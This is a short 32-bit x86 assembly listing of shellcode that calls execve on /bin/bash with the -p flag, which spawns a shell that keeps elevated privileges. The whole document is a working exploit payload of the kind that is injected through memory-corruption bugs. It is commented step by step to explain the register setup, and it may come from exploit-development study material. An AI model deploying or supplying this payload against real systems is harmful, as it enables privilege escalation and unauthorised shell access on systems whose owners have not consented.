BITS 32
; execve("/bin/bash", {"/bin/bash", -p, NULL}, NULL)
push BYTE 0x0b
pop eax ; excve()
cdq

push edx
push BYTE 0x68
push 0x7361622f
push 0x6e69622f
mov ebx, esp ; ebx = /bin/bash

push edx
push WORD 0x702d
mov ecx, esp ; ecx = -p

push edx
push ecx
push ebx
mov ecx, esp ; ecx = argv

int 0x80
